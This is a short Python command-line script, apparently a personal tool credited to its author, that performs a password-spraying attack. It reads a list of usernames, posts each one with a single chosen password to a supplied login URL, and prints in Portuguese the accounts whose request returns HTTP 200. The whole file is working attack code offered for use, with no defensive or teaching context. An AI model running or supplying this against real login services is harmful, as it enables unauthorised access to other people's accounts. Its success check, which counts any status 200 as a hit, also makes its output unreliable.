#Made by Sonael Neto

import getopt, sys, requests

argumentList = sys.argv[1:]

options = "p:u:hU:d:"

long_options = ["password", "users", "help", "url", "data"]

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

try:
    # Parsing argument
    arguments, values = getopt.getopt(argumentList, options, long_options)
    # checking each argument
    for currentArgument, currentValue in arguments:
        if currentArgument in ("-p", "--password"):
            password = currentValue
        elif currentArgument in ("-U", "--url"):
            url = currentValue
        elif currentArgument in ("-d", "--data"):
            data = currentValue
        elif currentArgument in ("-u", "--users"):
            file = open(currentValue, "r")
        elif currentArgument in ("-h", "--help"):
            print('Usage: python3 password_spray.py -p "password" -u users.txt -U "url" -d "uname=USERS&pass=PASS"')

except getopt.error as err:
    # output error, and return with an error code
    print (str(err))


try:
    users = []
    for user in file:
        r = requests.post(url, data=data.replace("USERS", user).replace("PASS", password), headers=headers)

        if r.status_code == 200:
            users.append(user.strip())

    print("Usuários encontrados: " + str(users))
except:
    exit(0)


